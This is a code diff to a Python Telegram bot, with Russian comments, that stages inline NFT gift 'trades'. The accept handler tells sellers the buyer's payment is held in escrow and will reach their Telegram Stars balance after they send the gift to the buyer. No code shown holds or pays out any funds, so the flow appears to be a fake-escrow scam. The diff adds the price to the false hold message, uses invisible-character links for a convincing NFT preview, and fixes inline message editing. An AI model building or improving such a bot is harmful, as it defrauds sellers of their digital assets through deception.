@@ -109,8 +109,8 @@ async def process_inline_trade(inline_query: InlineQuery):
         "nft_url": nft_transfer_url
     }
 
-    # Скрытая ссылка для подгрузки картинки
-    hidden_image_link = f'<a href="{nft_transfer_url}">&#8288;</a>'
+    # Невидимый символ со ссылкой для подгрузки медиа
+    hidden_image_link = f'<a href="{nft_transfer_url}">&#8203;</a>'
 
     # ШАГ 1: Сообщение предложения о покупке
     message_text = (
@@ -149,7 +149,7 @@ async def process_inline_trade(inline_query: InlineQuery):
             link_preview_options=LinkPreviewOptions(
                 url=nft_transfer_url,
                 prefer_large_media=True,
-                show_above_text=False
+                show_above_text=True
             )
         ),
         reply_markup=keyboard
@@ -161,7 +161,7 @@ async def process_inline_trade(inline_query: InlineQuery):
 # ШАГ 2: Продавец нажимает «Принять предложение»
 # ==========================================
 @router.callback_query(F.data.startswith("accept:"))
-async def accept_trade_handler(callback: CallbackQuery):
+async def accept_trade_handler(callback: CallbackQuery, bot: Bot):
     trade_id = callback.data.split(":")[1]
     trade = TRADES_CACHE.get(trade_id)
 
@@ -176,12 +176,12 @@ async def accept_trade_handler(callback: CallbackQuery):
     buyer_tag = trade["buyer_tag"]
     nft_url = trade["nft_url"]
 
-    hidden_image_link = f'<a href="{nft_url}">&#8288;</a>'
+    hidden_image_link = f'<a href="{nft_url}">&#8203;</a>'
 
-    # Текст инструкции для продавца
+    # Текст инструкции для продавца с информацией о холде
     updated_text = (
         f"{hidden_image_link}📋 <b>Ордер #{trade_id}</b>\n\n"
-        f"Средства хранятся на специальном эскроу-счёте и будут автоматически зачислены на ваш баланс Telegram Stars сразу после передачи подарка.\n\n"
+        f"Средства <b>{price} {currency}</b> находятся на специальном эскроу-счёте (в холде) и будут автоматически зачислены на ваш баланс Telegram Stars сразу после передачи подарка.\n\n"
         f"<b>Инструкция для завершения сделки:</b>\n"
         f"1. Передайте подарок пользователю: {buyer_tag}\n"
         f"2. Нажмите «Передать NFT» и выберите <b>{item_name} #{item_id}</b>\n"
@@ -193,7 +193,7 @@ async def accept_trade_handler(callback: CallbackQuery):
         inline_keyboard=[
             [
                 InlineKeyboardButton(
-                    text="Передать NFT", 
+                    text="🎁 Передать NFT", 
                     url=nft_url
                 )
             ],
@@ -206,17 +206,32 @@ async def accept_trade_handler(callback: CallbackQuery):
         ]
     )
 
-    await callback.answer("Предложение принято! Следуйте инструкции.")
-    await callback.message.edit_text(
-        text=updated_text,
-        parse_mode="HTML",
-        reply_markup=step2_keyboard,
-        link_preview_options=LinkPreviewOptions(
-            url=nft_url,
-            prefer_large_media=True,
-            show_above_text=False
+    await callback.answer("Предложение принято! Передайте NFT по инструкции.")
+
+    # Исправление редактирования для инлайн-сообщений
+    if callback.inline_message_id:
+        await bot.edit_message_text(
+            inline_message_id=callback.inline_message_id,
+            text=updated_text,
+            parse_mode="HTML",
+            reply_markup=step2_keyboard,
+            link_preview_options=LinkPreviewOptions(
+                url=nft_url,
+                prefer_large_media=True,
+                show_above_text=True
+            )
         )
-    )
+    elif callback.message:
+        await callback.message.edit_text(
+            text=updated_text,
+            parse_mode="HTML",
+            reply_markup=step2_keyboard,
+            link_preview_options=LinkPreviewOptions(
+                url=nft_url,
+                prefer_large_media=True,
+                show_above_text=True
+            )
+        )
 
 # ==========================================
 # ШАГ 3: Продавец нажимает «Подтвердить передачу»
@@ -232,16 +247,25 @@ async def confirm_transfer_handler(callback: CallbackQuery):
 # Отмена сделки
 # ==========================================
 @router.callback_query(F.data.startswith("cancel:"))
-async def cancel_trade_handler(callback: CallbackQuery):
+async def cancel_trade_handler(callback: CallbackQuery, bot: Bot):
     trade_id = callback.data.split(":")[1]
     TRADES_CACHE.pop(trade_id, None)
 
     await callback.answer(text="Сделка отменена.", show_alert=True)
-    await callback.message.edit_text(
-        text="❌ <b>Сделка была отменена.</b>",
-        parse_mode="HTML",
-        reply_markup=None
-    )
+    
+    if callback.inline_message_id:
+        await bot.edit_message_text(
+            inline_message_id=callback.inline_message_id,
+            text="❌ <b>Сделка была отменена.</b>",
+            parse_mode="HTML",
+            reply_markup=None
+        )
+    elif callback.message:
+        await callback.message.edit_text(
+            text="❌ <b>Сделка была отменена.</b>",
+            parse_mode="HTML",
+            reply_markup=None
+        )
 
 # Веб-сервер для поддержания работы на Render
 async def handle_health_check(request):
